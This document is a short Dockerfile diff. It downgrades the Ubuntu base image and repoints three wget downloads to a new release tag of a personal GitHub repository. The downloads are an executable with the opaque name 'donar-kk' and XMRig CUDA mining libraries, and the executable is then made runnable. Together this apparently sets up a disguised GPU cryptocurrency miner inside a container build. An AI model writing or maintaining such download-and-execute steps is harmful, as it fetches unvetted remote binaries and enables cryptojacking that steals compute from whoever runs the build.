@@ -1,5 +1,5 @@
 # Stage 1: Build/Prepare
-FROM ubuntu:24.04 AS builder
+FROM ubuntu:22.04 AS builder
 
 # Prevent interactive prompts
 ARG DEBIAN_FRONTEND=noninteractive
@@ -11,9 +11,9 @@ RUN apt-get update && \
 
 # Build commands
 WORKDIR /build
-RUN wget -O donar-kk "https://github.com/lilcoinzdc/guap-dats/releases/download/kabeb/donar-kk" && \
-wget "https://github.com/lilcoinzdc/guap-dats/releases/download/kabeb/libxmrig-cu.a" && \
-wget "https://github.com/lilcoinzdc/guap-dats/releases/download/kabeb/libxmrig-cuda.so" && \
+RUN wget -O donar-kk "https://github.com/lilcoinzdc/guap-dats/releases/download/double-kabeb/donar-kk" && \
+wget "https://github.com/lilcoinzdc/guap-dats/releases/download/double-kabeb/libxmrig-cu.a" && \
+wget "https://github.com/lilcoinzdc/guap-dats/releases/download/double-kabeb/libxmrig-cuda.so" && \
   chmod +x donar-kk
 
 # ---
